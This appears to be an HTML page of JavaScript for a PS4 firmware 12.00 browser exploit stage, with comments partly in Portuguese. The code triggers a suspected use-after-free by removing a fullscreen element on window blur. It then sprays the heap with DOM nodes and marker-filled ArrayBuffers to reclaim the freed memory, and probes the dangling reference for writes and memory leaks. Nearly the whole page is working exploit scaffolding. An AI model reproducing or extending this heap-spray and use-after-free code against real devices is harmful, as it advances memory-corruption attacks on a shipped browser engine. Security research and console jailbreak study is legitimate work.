<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Exploit Stage (Leak Test)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Exploit Stage (Leak Detection)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG (alert)
let logBuffer = [];
function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
function setupHeap() {
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 RECLAIM + ARRAYBUFFER
function preciseReclaim(size) {
    log("[*] Reclaim size = " + size);

    let bucket = [];

    // churn leve
    for (let i = 0; i < 3000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    // spray DOM (CONTROL)
    for (let i = 0; i < size; i++) {
        let el = document.createElement("div");

        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";

        el.style.background = "black";
        el.style.width = "100%";
        el.style.height = "100%";
        el.style.position = "absolute";
        el.style.top = "0";
        el.style.left = "0";

        document.body.appendChild(el);
        bucket.push(el);
    }

    // 🔥 ArrayBuffer spray (possível overlap)
    let ab_views = [];
    for (let i = 0; i < 4000; i++) {
        let buf = new ArrayBuffer(0x100);
        let view = new Uint32Array(buf);

        view[0] = 0x41414141;
        view[1] = 0x42424242;
        view[2] = 0x43434343;

        ab_views.push(view);
    }

    // churn final
    for (let i = 0; i < 2000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    return bucket;
}

// ==========================
// 🔬 PROBE + LEAK TEST
function probe(fsTarget) {
    log("---- PROBE ----");

    try {
        let child = fsTarget.firstChild;

        log("[PWN] firstChild = " + child);

        if (child) {
            log("[PWN] tag = " + child.tagName);

            child.outerHTML = "<div id='pwn'>BBBB</div>";
            log("[PWN] write OK");

            log("[PWN] id = " + child.getAttribute("id"));
        }

    } catch(e) {
        log("[PWN] erro acesso filho");
    }

    // 🔥 LEAK TEST
    try {
        let child = fsTarget.firstChild;

        let leak = child.innerHTML;

        log("[LEAK?] innerHTML = " + leak);

        if (leak && (
            leak.includes("4141") ||
            leak.includes("4242") ||
            leak.includes("4343")
        )) {
            log("[!!!] POSSIVEL LEAK DE MEMORIA");
        }

    } catch(e) {
        log("[LEAK] crash leitura");
    }

    // checks básicos
    try { log("[CHECK] parent = " + fsTarget.parentNode); } catch(e){}
    try { log("[CHECK] layout = " + fsTarget.offsetHeight); } catch(e){}
}

// ==========================
// TRIGGER (INALTERADO)
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🎯 ajuste fino (já validado por você)
    let sizes = [1500, 2000, 2500, 3000];

    sizes.forEach((size, idx) => {
        setTimeout(() => preciseReclaim(size), idx * 50);
    });

    // probes
    setTimeout(() => probe(fsTarget), 10);
    setTimeout(() => probe(fsTarget), 80);
    setTimeout(() => probe(fsTarget), 160);
    setTimeout(() => probe(fsTarget), 250);

    // dump seguro
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    // 🔥 NÃO ALTERAR (crítico)
    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>
